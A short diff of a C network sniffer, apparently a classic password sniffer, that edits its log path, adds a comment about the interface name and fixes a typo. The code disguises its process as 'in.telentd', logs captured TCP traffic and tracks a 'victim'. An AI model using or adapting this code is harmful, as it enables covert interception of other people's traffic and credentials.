@@ -25,7 +25,7 @@ FILE *fp;
 
 #define CAPTLEN 512
 #define TIMEOUT 30
-#define TCPLOG "../tcp.log"
+#define TCPLOG "./tcp.log"
 
 int openintf(char *d)
 {
@@ -201,7 +201,7 @@ void cleanup(int sig)
 int main(int argc,char **argv)
 {
     sprintf(argv[0],"%s","in.telentd");
-    s = openintf("eth0");
+    s = openintf("eth0");           // your device's name
     ip = (struct iphdr*)(((unsigned long)&ep.ip) - 2);
     tcp = (struct tcphdr*)(((unsigned long)&ep.tcp) - 2);
     signal(SIGHUP,SIG_IGN);
@@ -216,7 +216,7 @@ int main(int argc,char **argv)
         fp = fopen(TCPLOG,"at");
     if(fp == NULL)
     {
-        fprintf(stderr,"can't open long\n");
+        fprintf(stderr,"can't open log\n");
         exit(0);
     }
     clear_victim();
